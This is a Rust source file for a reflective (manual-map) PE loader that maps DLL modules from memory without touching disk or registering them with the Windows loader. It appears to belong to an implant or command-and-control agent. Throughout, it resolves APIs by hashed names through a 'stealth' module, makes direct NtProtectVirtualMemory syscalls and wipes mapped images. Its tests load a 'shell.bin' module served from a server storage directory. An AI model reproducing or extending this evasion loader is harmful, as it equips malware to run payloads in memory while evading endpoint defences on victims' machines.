//! Manual-Map (reflective) PE loader for L2 modules.
//!
//! Maps a PE image from a byte buffer without writing it to a durable path
//! and without registering it via `LoadLibrary` (so it is not a normal PEB
//! module entry for the mapped image itself).
//!
//! Import resolution still uses already-loaded system DLLs via PEB +
//! `LoadLibraryA`/`GetProcAddress` for missing dependencies — only the
//! *payload* image avoids disk.
//!
//! Windows only. Feature: `mem-map`.

#![cfg(all(windows, feature = "mem-map"))]

use crate::native::memory::{nt_alloc_rw, nt_free};
use crate::stealth;
use log::{debug, warn};

const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
#[cfg(target_arch = "x86")]
const IMAGE_FILE_MACHINE_I386: u16 = 0x014c;
#[cfg(target_arch = "x86_64")]
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_REL_BASED_HIGHLOW: u16 = 3;
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

/// Result of a successful Manual-Map.
pub struct MappedModule {
    pub base: usize,
    pub size: usize,
    pub mod_init: Option<unsafe extern "C" fn() -> i32>,
    pub mod_invoke: Option<
        unsafe extern "C" fn(
            *const u8,
            u32,
            *const u8,
            u32,
            *mut *mut u8,
            *mut u32,
        ) -> i32,
    >,
    pub mod_free: Option<unsafe extern "C" fn(*mut u8, u32)>,
    pub mod_shutdown: Option<unsafe extern "C" fn() -> i32>,
    /// True if DllMain was invoked on attach (must detach on unmap).
    pub dll_main_called: bool,
}

/// Map PE bytes into private memory, resolve imports/relocs, resolve L2 exports.
pub fn map_pe(pe: &[u8]) -> Result<MappedModule, String> {
    map_pe_opts(pe, true)
}

/// Like `map_pe`, but optionally skip DllMain (export-only probe / safer tests).
pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, String> {
    if pe.len() < 0x40 {
        return Err("pe_map: buffer too small".into());
    }
    if pe[0] != b'M' || pe[1] != b'Z' {
        return Err("pe_map: not MZ".into());
    }

    let dos_e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if dos_e_lfanew + 0x18 > pe.len() {
        return Err("pe_map: bad e_lfanew".into());
    }
    let nt = dos_e_lfanew;
    let sig = u32::from_le_bytes([pe[nt], pe[nt + 1], pe[nt + 2], pe[nt + 3]]);
    if sig != IMAGE_NT_SIGNATURE {
        return Err("pe_map: bad PE signature".into());
    }

    let machine = u16::from_le_bytes([pe[nt + 4], pe[nt + 5]]);
    #[cfg(target_arch = "x86_64")]
    if machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!("pe_map: machine 0x{machine:x} != amd64"));
    }
    #[cfg(target_arch = "x86")]
    if machine != IMAGE_FILE_MACHINE_I386 {
        return Err(format!("pe_map: machine 0x{machine:x} != i386"));
    }

    let num_sections = u16::from_le_bytes([pe[nt + 6], pe[nt + 7]]) as usize;
    let opt_hdr_size = u16::from_le_bytes([pe[nt + 20], pe[nt + 21]]) as usize;
    let opt = nt + 24;
    if opt + opt_hdr_size > pe.len() {
        return Err("pe_map: truncated optional header".into());
    }

    let magic = u16::from_le_bytes([pe[opt], pe[opt + 1]]);
    let (size_of_image, size_of_headers, image_base, entry_rva, export_rva, export_size, import_rva, reloc_rva, reloc_size, tls_rva) =
        if magic == 0x20B {
            // PE32+
            let size_of_image = u32::from_le_bytes(pe[opt + 56..opt + 60].try_into().unwrap()) as usize;
            let size_of_headers = u32::from_le_bytes(pe[opt + 60..opt + 64].try_into().unwrap()) as usize;
            let image_base = u64::from_le_bytes(pe[opt + 24..opt + 32].try_into().unwrap()) as usize;
            let entry_rva = u32::from_le_bytes(pe[opt + 16..opt + 20].try_into().unwrap()) as usize;
            let dd = opt + 112; // DataDirectory start PE32+
            let export_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_EXPORT);
            let export_size = dir_size(pe, dd, IMAGE_DIRECTORY_ENTRY_EXPORT);
            let import_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_IMPORT);
            let reloc_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_BASERELOC);
            let reloc_size = dir_size(pe, dd, IMAGE_DIRECTORY_ENTRY_BASERELOC);
            let tls_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_TLS);
            (
                size_of_image,
                size_of_headers,
                image_base,
                entry_rva,
                export_rva,
                export_size,
                import_rva,
                reloc_rva,
                reloc_size,
                tls_rva,
            )
        } else if magic == 0x10B {
            // PE32
            let size_of_image = u32::from_le_bytes(pe[opt + 56..opt + 60].try_into().unwrap()) as usize;
            let size_of_headers = u32::from_le_bytes(pe[opt + 60..opt + 64].try_into().unwrap()) as usize;
            let image_base = u32::from_le_bytes(pe[opt + 28..opt + 32].try_into().unwrap()) as usize;
            let entry_rva = u32::from_le_bytes(pe[opt + 16..opt + 20].try_into().unwrap()) as usize;
            let dd = opt + 96;
            let export_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_EXPORT);
            let export_size = dir_size(pe, dd, IMAGE_DIRECTORY_ENTRY_EXPORT);
            let import_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_IMPORT);
            let reloc_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_BASERELOC);
            let reloc_size = dir_size(pe, dd, IMAGE_DIRECTORY_ENTRY_BASERELOC);
            let tls_rva = dir_rva(pe, dd, IMAGE_DIRECTORY_ENTRY_TLS);
            (
                size_of_image,
                size_of_headers,
                image_base,
                entry_rva,
                export_rva,
                export_size,
                import_rva,
                reloc_rva,
                reloc_size,
                tls_rva,
            )
        } else {
            return Err(format!("pe_map: unknown optional magic 0x{magic:x}"));
        };

    // Static TLS + DllMain on Manual-Map of MSVC/Rust CRT often AV. Fail closed so
    // module_loader can LoadLibrary-fallback without killing the process.
    if call_dll_main && tls_rva != 0 {
        return Err(
            "pe_map: TLS directory present — refuse DllMain Manual-Map (use OS loader fallback)"
                .into(),
        );
    }

    if size_of_image == 0 || size_of_image > 256 * 1024 * 1024 {
        return Err(format!("pe_map: absurd SizeOfImage {size_of_image}"));
    }
    if size_of_headers > pe.len() || size_of_headers > size_of_image {
        return Err("pe_map: bad SizeOfHeaders".into());
    }

    let section_table = opt + opt_hdr_size;
    if section_table + num_sections * 40 > pe.len() {
        return Err("pe_map: truncated section table".into());
    }

    let base_ptr = nt_alloc_rw(size_of_image, true).map_err(|e| format!("pe_map alloc: {e}"))?;
    let base = base_ptr as usize;

    // Copy headers
    unsafe {
        std::ptr::copy_nonoverlapping(pe.as_ptr(), base_ptr, size_of_headers.min(pe.len()));
    }

    // Copy sections
    for i in 0..num_sections {
        let sh = section_table + i * 40;
        let va = u32::from_le_bytes(pe[sh + 12..sh + 16].try_into().unwrap()) as usize;
        let raw_size = u32::from_le_bytes(pe[sh + 16..sh + 20].try_into().unwrap()) as usize;
        let raw_ptr = u32::from_le_bytes(pe[sh + 20..sh + 24].try_into().unwrap()) as usize;
        let virt_size = u32::from_le_bytes(pe[sh + 8..sh + 12].try_into().unwrap()) as usize;
        if raw_ptr == 0 || raw_size == 0 {
            continue;
        }
        if raw_ptr + raw_size > pe.len() {
            unsafe {
                wipe_and_free(base_ptr, size_of_image);
            }
            return Err(format!("pe_map: section {i} raw out of bounds"));
        }
        if va >= size_of_image {
            continue;
        }
        let copy_len = raw_size.min(virt_size.max(raw_size)).min(size_of_image - va);
        let copy_len = copy_len.min(raw_size);
        unsafe {
            std::ptr::copy_nonoverlapping(pe.as_ptr().add(raw_ptr), base_ptr.add(va), copy_len);
        }
    }

    // Relocations
    let delta = base.wrapping_sub(image_base) as isize;
    if delta != 0 && reloc_rva != 0 && reloc_size != 0 {
        if let Err(e) = unsafe { apply_relocs(base, size_of_image, reloc_rva, reloc_size, delta) } {
            unsafe {
                wipe_and_free(base_ptr, size_of_image);
            }
            return Err(e);
        }
    }

    // Imports
    if import_rva != 0 {
        if let Err(e) = unsafe { resolve_imports(base, size_of_image, import_rva) } {
            unsafe {
                wipe_and_free(base_ptr, size_of_image);
            }
            return Err(e);
        }
    }

    // Section protections (no lingering RWX when avoidable)
    if let Err(e) = unsafe { protect_sections(base, size_of_image, pe, section_table, num_sections) } {
        warn!("[pe_map] protect_sections: {e}");
        // non-fatal: leave RW
    }

    // DllMain for CRT/static init (Rust cdylib often needs this).
    // Complex CRT/TLS modules may AV here — product path falls back to LoadLibrary.
    let mut dll_main_called = false;
    if call_dll_main && entry_rva != 0 && entry_rva < size_of_image {
        type DllMainFn =
            unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void) -> i32;
        let entry: DllMainFn = unsafe { std::mem::transmute(base + entry_rva) };
        let ok = unsafe { entry(base as *mut _, DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
        if ok == 0 {
            unsafe {
                wipe_and_free(base_ptr, size_of_image);
            }
            return Err("pe_map: DllMain(DLL_PROCESS_ATTACH) failed".into());
        }
        dll_main_called = true;
    }

    // Resolve L2 exports by walking export dir (not GetProcAddress — image not in loader list)
    let mod_init = unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_init") }
        .map(|a| unsafe { std::mem::transmute(a) });
    let mod_invoke =
        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_invoke") }
            .map(|a| unsafe { std::mem::transmute(a) });
    let mod_free = unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_free") }
        .map(|a| unsafe { std::mem::transmute(a) });
    let mod_shutdown =
        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_shutdown") }
            .map(|a| unsafe { std::mem::transmute(a) });

    if mod_invoke.is_none() {
        let _ = unmap_pe_inner(base, size_of_image, dll_main_called);
        return Err("pe_map: export mod_invoke not found".into());
    }

    debug!(
        "[pe_map] mapped image base=0x{base:x} size=0x{size_of_image:x} dll_main={dll_main_called}"
    );

    Ok(MappedModule {
        base,
        size: size_of_image,
        mod_init,
        mod_invoke,
        mod_free,
        mod_shutdown,
        dll_main_called,
    })
}

/// Unmap a previously mapped module (DllMain detach + wipe + free).
pub fn unmap_pe(m: &MappedModule) {
    unmap_image(m.base, m.size, m.dll_main_called);
}

/// Unmap by base/size (used by module_loader without cloning export fns).
pub fn unmap_image(base: usize, size: usize, dll_main_called: bool) {
    let _ = unmap_pe_inner(base, size, dll_main_called);
}

fn unmap_pe_inner(base: usize, size: usize, dll_main_called: bool) -> Result<(), String> {
    if base == 0 {
        return Ok(());
    }
    if dll_main_called {
        unsafe {
            let dos = base as *const u8;
            if *dos == b'M' && *dos.add(1) == b'Z' {
                let e_lfanew = u32::from_le_bytes([
                    *dos.add(0x3C),
                    *dos.add(0x3D),
                    *dos.add(0x3E),
                    *dos.add(0x3F),
                ]) as usize;
                if e_lfanew + 24 + 20 < size {
                    let opt = base + e_lfanew + 24;
                    let magic = u16::from_le_bytes([
                        *(opt as *const u8),
                        *((opt + 1) as *const u8),
                    ]);
                    let entry_rva = if magic == 0x20B || magic == 0x10B {
                        u32::from_le_bytes([
                            *((opt + 16) as *const u8),
                            *((opt + 17) as *const u8),
                            *((opt + 18) as *const u8),
                            *((opt + 19) as *const u8),
                        ]) as usize
                    } else {
                        0
                    };
                    if entry_rva != 0 && entry_rva < size {
                        type DllMainFn = unsafe extern "system" fn(
                            *mut core::ffi::c_void,
                            u32,
                            *mut core::ffi::c_void,
                        ) -> i32;
                        let mut old = 0u32;
                        let mut b = base;
                        let mut region = size;
                        let _ = crate::syscall_nt!(
                            b"NtProtectVirtualMemory",
                            0xFFFFFFFFFFFFFFFFusize,
                            &mut b as *mut usize,
                            &mut region as *mut usize,
                            PAGE_EXECUTE_READWRITE,
                            &mut old as *mut u32,
                        );
                        let entry: DllMainFn = std::mem::transmute(base + entry_rva);
                        let _ = entry(base as *mut _, DLL_PROCESS_DETACH, std::ptr::null_mut());
                    }
                }
            }
        }
    }
    unsafe {
        wipe_and_free(base as *mut u8, size);
    }
    Ok(())
}

fn dir_rva(pe: &[u8], dd_base: usize, index: usize) -> usize {
    let off = dd_base + index * 8;
    if off + 4 > pe.len() {
        return 0;
    }
    u32::from_le_bytes(pe[off..off + 4].try_into().unwrap()) as usize
}

fn dir_size(pe: &[u8], dd_base: usize, index: usize) -> usize {
    let off = dd_base + index * 8 + 4;
    if off + 4 > pe.len() {
        return 0;
    }
    u32::from_le_bytes(pe[off..off + 4].try_into().unwrap()) as usize
}

unsafe fn apply_relocs(
    base: usize,
    size_of_image: usize,
    reloc_rva: usize,
    reloc_size: usize,
    delta: isize,
) -> Result<(), String> {
    if reloc_rva + reloc_size > size_of_image {
        return Err("pe_map: reloc dir OOB".into());
    }
    let mut off = 0usize;
    while off + 8 <= reloc_size {
        let block = base + reloc_rva + off;
        let page_rva = *(block as *const u32) as usize;
        let block_size = *((block + 4) as *const u32) as usize;
        if block_size < 8 {
            break;
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry = *((block + 8 + i * 2) as *const u16);
            let typ = entry >> 12;
            let ent_off = (entry & 0x0FFF) as usize;
            let target = base + page_rva + ent_off;
            if target + 8 > base + size_of_image {
                continue;
            }
            match typ {
                IMAGE_REL_BASED_ABSOLUTE => {}
                IMAGE_REL_BASED_DIR64 => {
                    let p = target as *mut u64;
                    *p = (*p as i64).wrapping_add(delta as i64) as u64;
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    let p = target as *mut u32;
                    *p = (*p as i32).wrapping_add(delta as i32) as u32;
                }
                _ => {
                    // skip unknown
                }
            }
        }
        off += block_size;
    }
    Ok(())
}

unsafe fn resolve_imports(base: usize, size_of_image: usize, import_rva: usize) -> Result<(), String> {
    // IMAGE_IMPORT_DESCRIPTOR is 20 bytes
    let mut desc = base + import_rva;
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return Err("pe_map: kernel32 missing".into());
    }
    type LoadLibraryAFn = unsafe extern "system" fn(*const i8) -> *mut core::ffi::c_void;
    type GetProcAddressFn =
        unsafe extern "system" fn(*mut core::ffi::c_void, *const i8) -> *mut core::ffi::c_void;
    let load_lib: LoadLibraryAFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"LoadLibraryA"))
            .ok_or("pe_map: LoadLibraryA missing")?,
    );
    let get_proc: GetProcAddressFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"GetProcAddress"))
            .ok_or("pe_map: GetProcAddress missing")?,
    );

    loop {
        if desc + 20 > base + size_of_image {
            break;
        }
        let original_first_thunk = *(desc as *const u32) as usize; // Characteristics / OFT
        let name_rva = *((desc + 12) as *const u32) as usize;
        let first_thunk = *((desc + 16) as *const u32) as usize;
        if original_first_thunk == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva == 0 || name_rva >= size_of_image {
            break;
        }
        let dll_name = read_cstr(base + name_rva, base + size_of_image)
            .ok_or_else(|| "pe_map: bad import DLL name".to_string())?;
        let hmod = {
            // Prefer already-loaded via PEB
            let h = stealth::get_module_base(stealth::hash_module_name(dll_name.as_bytes()));
            if h != 0 {
                h as *mut core::ffi::c_void
            } else {
                let c = std::ffi::CString::new(dll_name.as_str())
                    .map_err(|_| "pe_map: dll name cstring".to_string())?;
                let p = load_lib(c.as_ptr());
                if p.is_null() {
                    return Err(format!("pe_map: LoadLibraryA failed for {dll_name}"));
                }
                p
            }
        };

        let mut oft = if original_first_thunk != 0 {
            base + original_first_thunk
        } else {
            base + first_thunk
        };
        let mut ift = base + first_thunk;
        #[cfg(target_arch = "x86_64")]
        let ord_flag: u64 = 0x8000_0000_0000_0000;
        #[cfg(target_arch = "x86")]
        let ord_flag: u32 = 0x8000_0000;

        loop {
            #[cfg(target_arch = "x86_64")]
            let raw = *(oft as *const u64);
            #[cfg(target_arch = "x86")]
            let raw = *(oft as *const u32) as u64;

            if raw == 0 {
                break;
            }
            let proc = if raw & ord_flag != 0 {
                let ord = (raw & 0xFFFF) as u16;
                get_proc(hmod, ord as usize as *const i8)
            } else {
                let hint_name = base + (raw as usize & 0x7FFF_FFFF);
                if hint_name + 2 >= base + size_of_image {
                    return Err("pe_map: import name OOB".into());
                }
                let name_ptr = (hint_name + 2) as *const i8;
                get_proc(hmod, name_ptr)
            };
            if proc.is_null() {
                return Err("pe_map: GetProcAddress failed for import".into());
            }
            #[cfg(target_arch = "x86_64")]
            {
                *(ift as *mut u64) = proc as u64;
                oft += 8;
                ift += 8;
            }
            #[cfg(target_arch = "x86")]
            {
                *(ift as *mut u32) = proc as u32;
                oft += 4;
                ift += 4;
            }
        }
        desc += 20;
    }
    Ok(())
}

unsafe fn protect_sections(
    base: usize,
    size_of_image: usize,
    pe: &[u8],
    section_table: usize,
    num_sections: usize,
) -> Result<(), String> {
    // Headers → R
    protect(base, pe_header_size(pe).min(size_of_image), PAGE_READONLY);

    for i in 0..num_sections {
        let sh = section_table + i * 40;
        let va = u32::from_le_bytes(pe[sh + 12..sh + 16].try_into().unwrap()) as usize;
        let virt_size = u32::from_le_bytes(pe[sh + 8..sh + 12].try_into().unwrap()) as usize;
        let chars = u32::from_le_bytes(pe[sh + 36..sh + 40].try_into().unwrap());
        if virt_size == 0 || va >= size_of_image {
            continue;
        }
        let len = virt_size.min(size_of_image - va);
        let exec = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        let write = (chars & IMAGE_SCN_MEM_WRITE) != 0;
        let read = (chars & IMAGE_SCN_MEM_READ) != 0;
        let prot = match (exec, write, read) {
            (true, true, _) => PAGE_EXECUTE_READWRITE,
            (true, false, _) => PAGE_EXECUTE_READ,
            (false, true, _) => PAGE_READWRITE,
            (false, false, true) => PAGE_READONLY,
            _ => PAGE_NOACCESS,
        };
        protect(base + va, len, prot);
    }
    Ok(())
}

fn pe_header_size(pe: &[u8]) -> usize {
    if pe.len() < 0x40 {
        return 0x1000;
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    let opt = e_lfanew + 24;
    if opt + 64 > pe.len() {
        return 0x1000;
    }
    let magic = u16::from_le_bytes([pe[opt], pe[opt + 1]]);
    let off = if magic == 0x20B || magic == 0x10B {
        opt + 60
    } else {
        return 0x1000;
    };
    u32::from_le_bytes(pe[off..off + 4].try_into().unwrap()) as usize
}

unsafe fn protect(addr: usize, size: usize, new_prot: u32) {
    if size == 0 {
        return;
    }
    let mut base = addr;
    let mut region = size;
    let mut old = 0u32;
    let _ = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        0xFFFFFFFFFFFFFFFFusize,
        &mut base as *mut usize,
        &mut region as *mut usize,
        new_prot,
        &mut old as *mut u32,
    );
}

unsafe fn resolve_export(
    base: usize,
    size_of_image: usize,
    export_rva: usize,
    export_size: usize,
    name: &[u8],
) -> Option<usize> {
    if export_rva == 0 || export_size < 40 {
        return None;
    }
    if export_rva + export_size > size_of_image {
        return None;
    }
    let exp = base + export_rva;
    // IMAGE_EXPORT_DIRECTORY
    let num_names = *((exp + 24) as *const u32) as usize;
    let addr_of_functions = *((exp + 28) as *const u32) as usize;
    let addr_of_names = *((exp + 32) as *const u32) as usize;
    let addr_of_ordinals = *((exp + 36) as *const u32) as usize;
    if addr_of_functions == 0 || addr_of_names == 0 || addr_of_ordinals == 0 {
        return None;
    }
    for i in 0..num_names {
        let name_rva = *((base + addr_of_names + i * 4) as *const u32) as usize;
        if name_rva >= size_of_image {
            continue;
        }
        let ename = read_cstr(base + name_rva, base + size_of_image)?;
        if ename.as_bytes() == name {
            let ord = *((base + addr_of_ordinals + i * 2) as *const u16) as usize;
            let func_rva = *((base + addr_of_functions + ord * 4) as *const u32) as usize;
            if func_rva == 0 || func_rva >= size_of_image {
                return None;
            }
            // Forwarded export? if rva inside export dir
            if func_rva >= export_rva && func_rva < export_rva + export_size {
                return None; // skip forwarded for MVP
            }
            return Some(base + func_rva);
        }
    }
    None
}

unsafe fn read_cstr(ptr: usize, end: usize) -> Option<String> {
    if ptr >= end {
        return None;
    }
    let mut len = 0usize;
    while ptr + len < end {
        let b = *((ptr + len) as *const u8);
        if b == 0 {
            let s = std::slice::from_raw_parts(ptr as *const u8, len);
            return std::str::from_utf8(s).ok().map(|x| x.to_string());
        }
        len += 1;
        if len > 512 {
            break;
        }
    }
    None
}

unsafe fn wipe_and_free(ptr: *mut u8, size: usize) {
    if !ptr.is_null() && size > 0 {
        // Best-effort make writable then zero
        let mut base = ptr as usize;
        let mut region = size;
        let mut old = 0u32;
        let _ = crate::syscall_nt!(
            b"NtProtectVirtualMemory",
            0xFFFFFFFFFFFFFFFFusize,
            &mut base as *mut usize,
            &mut region as *mut usize,
            PAGE_READWRITE,
            &mut old as *mut u32,
        );
        std::ptr::write_bytes(ptr, 0, size);
    }
    nt_free(ptr);
}

/// Runtime: should we attempt Manual-Map?
pub fn mem_map_enabled() -> bool {
    if let Ok(v) = std::env::var("CUPCAKE_MEM_MAP") {
        let t = v.trim();
        if t == "0" || t.eq_ignore_ascii_case("false") || t.eq_ignore_ascii_case("off") {
            return false;
        }
    }
    true
}

/// Runtime or compile: refuse LoadLibrary fallback?
pub fn mem_map_strict() -> bool {
    if cfg!(feature = "mem-map-strict") {
        return true;
    }
    if let Ok(v) = std::env::var("CUPCAKE_MEM_MAP_STRICT") {
        let t = v.trim();
        if t == "1" || t.eq_ignore_ascii_case("true") || t.eq_ignore_ascii_case("on") {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn rejects_empty() {
        assert!(map_pe(&[]).is_err());
        assert!(map_pe(b"MZ").is_err());
    }

    #[test]
    fn rejects_non_pe() {
        let mut buf = vec![0u8; 128];
        buf[0] = b'M';
        buf[1] = b'Z';
        // e_lfanew points nowhere useful
        buf[0x3C] = 0x80;
        assert!(map_pe(&buf).is_err());
    }

    fn find_shell_bin() -> Option<PathBuf> {
        let candidates = [
            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../server/storage/modules/shell.bin"),
            PathBuf::from("server/storage/modules/shell.bin"),
            PathBuf::from("../server/storage/modules/shell.bin"),
            PathBuf::from("../../server/storage/modules/shell.bin"),
        ];
        candidates.into_iter().find(|p| p.is_file())
    }

    /// Hard success path when shell.bin exists: Manual-Map + export resolve + unmap.
    /// Uses export-only attach (no DllMain) so CRT AV cannot soft-pass as "ok failure".
    #[test]
    fn map_real_shell_exports_without_dllmain() {
        let path = find_shell_bin().unwrap_or_else(|| {
            panic!(
                "shell.bin required for pe_map success-path test (expected under server/storage/modules/shell.bin)"
            )
        });
        let pe = std::fs::read(&path).expect("read shell.bin");
        assert!(pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z');

        let m = map_pe_opts(&pe, false).unwrap_or_else(|e| {
            panic!("pe_map success path required for real shell.bin, got Err: {e}")
        });
        assert!(m.base != 0, "mapped base");
        assert!(m.size > 0, "mapped size");
        assert!(!m.dll_main_called);
        assert!(
            m.mod_invoke.is_some(),
            "mod_invoke export required on shell L2 module"
        );
        assert!(m.mod_init.is_some(), "mod_init export expected on shell module");
        unmap_pe(&m);
        eprintln!(
            "OK pe_map export probe success path (no cpx residual) on {}",
            path.display()
        );
    }

    /// Full map_pe (DllMain path) must return clean Err for TLS CRT modules — never AV.
    #[test]
    fn map_real_shell_full_dllmain_clean_err_or_ok() {
        let path = find_shell_bin().expect("shell.bin required");
        let pe = std::fs::read(&path).expect("read shell.bin");
        match map_pe(&pe) {
            Ok(m) => {
                assert!(m.mod_invoke.is_some());
                eprintln!(
                    "OK pe_map full DllMain map base=0x{:x} size={}",
                    m.base, m.size
                );
                unmap_pe(&m);
            }
            Err(e) => {
                eprintln!("pe_map full DllMain clean Err (LoadLibrary fallback): {e}");
                assert!(
                    e.contains("TLS")
                        || e.contains("DllMain")
                        || e.contains("pe_map")
                        || e.contains("import"),
                    "unexpected error shape: {e}"
                );
            }
        }
    }

    #[test]
    fn strict_helpers_respect_env() {
        // Default without env: enabled when feature compiled
        let _ = mem_map_enabled();
        let _ = mem_map_strict();
    }
}
